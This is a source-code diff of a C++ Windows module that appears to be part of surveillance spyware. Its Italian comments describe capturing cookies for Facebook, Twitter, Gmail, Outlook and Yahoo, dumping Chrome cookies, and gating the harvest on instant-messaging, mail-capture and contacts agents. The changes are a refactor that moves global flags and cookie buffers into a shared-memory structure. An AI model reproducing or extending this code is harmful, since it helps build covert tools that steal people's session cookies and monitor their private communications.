@@ -9,6 +9,7 @@
 #include <string>
 #include <time.h>
 #include "..\common.h"
+#include "../bss.h"
 #include "..\LOG.h"
 #include <json/JSON.h>
 #include "..\bin_string.h"
@@ -31,11 +32,6 @@ extern int DumpCHCookies(void); // Cookie per Chrome
 
 extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 extern BOOL IsCrisisNetwork();
-extern DWORD social_process_control; // Variabile per il controllo del processo. Dichiarata nell'agente principale
-
-extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
-extern BOOL bPM_MailCapStarted;
-extern BOOL bPM_ContactsStarted;
 
 SOCIAL_ENTRY social_entry[SOCIAL_ENTRY_COUNT];
 
@@ -198,9 +194,9 @@ void DumpNewCookies()
 
 void CheckProcessStatus()
 {
-	while(social_process_control == SOCIAL_PROCESS_PAUSE) 
+	while(shared.social_process_control == SOCIAL_PROCESS_PAUSE) 
 		Sleep(500);
-	if (social_process_control == SOCIAL_PROCESS_EXIT)
+	if (shared.social_process_control == SOCIAL_PROCESS_EXIT)
 		ExitProcess(0);
 }
 
@@ -229,11 +225,11 @@ void InitSocialEntries()
 	social_entry[7].RequestHandler = YahooContactHandler;
 
 	// Azzera i cookie in shared mem relativi a IExplorer
-	ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));
-	ZeroMemory(TWITTER_IE_COOKIE, sizeof(TWITTER_IE_COOKIE));
-	ZeroMemory(GMAIL_IE_COOKIE, sizeof(GMAIL_IE_COOKIE));
-	ZeroMemory(OUTLOOK_IE_COOKIE, sizeof(OUTLOOK_IE_COOKIE));
-	ZeroMemory(YAHOO_IE_COOKIE, sizeof(YAHOO_IE_COOKIE));
+	ZeroMemory(shared.FACEBOOK_IE_COOKIE, sizeof(shared.FACEBOOK_IE_COOKIE));
+	ZeroMemory(shared.TWITTER_IE_COOKIE, sizeof(shared.TWITTER_IE_COOKIE));
+	ZeroMemory(shared.GMAIL_IE_COOKIE, sizeof(shared.GMAIL_IE_COOKIE));
+	ZeroMemory(shared.OUTLOOK_IE_COOKIE, sizeof(shared.OUTLOOK_IE_COOKIE));
+	ZeroMemory(shared.YAHOO_IE_COOKIE, sizeof(shared.YAHOO_IE_COOKIE));
 }
 
 void SocialMainLoop()
@@ -248,7 +244,7 @@ void SocialMainLoop()
 	for (;;) {
 		// Busy wait...
 		for (int j=0; j<SLEEP_COOKIE; j++) {
-			if (!is_demo_version)
+			if (!shared.is_demo_version)
 				Sleep(1000);
 			else
 				Sleep(40);
@@ -256,7 +252,7 @@ void SocialMainLoop()
 		}
 
 		// Se tutti gli agenti sono fermi non catturo nemmeno i cookie
-		if (!bPM_IMStarted && !bPM_MailCapStarted && !bPM_ContactsStarted)
+		if (!shared.bPM_IMStarted && !shared.bPM_MailCapStarted && !shared.bPM_ContactsStarted)
 			continue;
 
 		// Verifica se qualcuno e' in attesa di nuovi cookies
